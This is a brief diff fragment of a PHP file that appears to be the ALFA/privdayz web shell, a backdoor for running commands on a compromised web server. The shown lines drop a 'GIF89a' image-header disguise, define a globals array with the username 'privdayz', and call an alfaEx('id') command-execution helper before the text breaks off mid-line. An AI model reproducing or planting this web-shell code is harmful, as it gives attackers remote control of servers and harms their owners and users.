@@ -1,4 +1,3 @@
-GIF89a;
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'privdayz',
@@ -1122,4 +1121,5 @@ $useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars">
 if(!@ini_get('safe_mode')){
 if(strlen(alfaEx("id",false,false))>0){
 echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
+
 $userful = array('gcc','lcc','cc','l
